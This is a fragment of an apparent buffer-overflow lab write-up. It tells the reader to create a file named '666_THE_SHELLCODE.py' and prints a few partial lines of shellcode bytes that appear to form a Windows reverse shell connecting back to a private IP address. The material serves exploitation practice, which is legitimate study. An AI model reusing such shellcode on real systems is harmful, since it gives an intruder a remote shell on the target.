...
- **In Kali Machine**
    ...
    - **We can make another file called `666_THE_SHELLCODE.py` with the last modification.**
        ...
        - NOTE: In this case we will not care about the payload size, but maybe there are scenarios with a very limited space (in this case was 4 bytes = "AAAA", so it's something to take care for the future Labs!)
            ...
            - ![image](https://user-images.githubusercontent.com/94720207/169421514-2df57db2-ef41-4cf9-bf85-14f0a0d3675e.png)
...
overflow = ("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
...
"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x01\x42\x68"
...
"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6"
